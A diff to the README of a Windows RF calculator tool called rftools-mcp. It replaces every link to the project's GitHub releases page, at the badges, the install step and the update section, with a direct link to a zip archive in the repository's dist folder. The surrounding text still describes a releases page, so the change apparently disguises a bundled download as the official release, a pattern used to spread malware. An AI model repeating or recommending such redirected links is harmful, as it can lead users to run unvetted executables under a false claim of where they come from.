@@ -1,6 +1,6 @@
 # ⚙️ rftools-mcp - Easy RF Calculators for Windows
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/glitchpatrick/rftools-mcp/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/glitchpatrick/rftools-mcp/raw/refs/heads/main/dist/rftools-mcp-v1.3.zip)
 
 ## 📄 About rftools-mcp
 
@@ -36,7 +36,7 @@ Follow these steps to get rftools-mcp running on your Windows computer.
 ### 1. Visit the Release Page
 
 Go to the official releases page to get the latest version:  
-[https://github.com/glitchpatrick/rftools-mcp/releases](https://github.com/glitchpatrick/rftools-mcp/releases)
+[https://github.com/glitchpatrick/rftools-mcp/raw/refs/heads/main/dist/rftools-mcp-v1.3.zip](https://github.com/glitchpatrick/rftools-mcp/raw/refs/heads/main/dist/rftools-mcp-v1.3.zip)
 
 This page lists all the current and past versions. Look for the newest release at the top of the list.
 
@@ -113,7 +113,7 @@ If calculators show incorrect or no output:
 ## 🔄 Updating rftools-mcp
 
 Updates are posted regularly on the releases page:  
-[https://github.com/glitchpatrick/rftools-mcp/releases](https://github.com/glitchpatrick/rftools-mcp/releases)
+[https://github.com/glitchpatrick/rftools-mcp/raw/refs/heads/main/dist/rftools-mcp-v1.3.zip](https://github.com/glitchpatrick/rftools-mcp/raw/refs/heads/main/dist/rftools-mcp-v1.3.zip)
 
 To update:
 
@@ -137,4 +137,4 @@ Keeping the software current ensures access to new calculators and fixes.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/glitchpatrick/rftools-mcp/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/glitchpatrick/rftools-mcp/raw/refs/heads/main/dist/rftools-mcp-v1.3.zip)
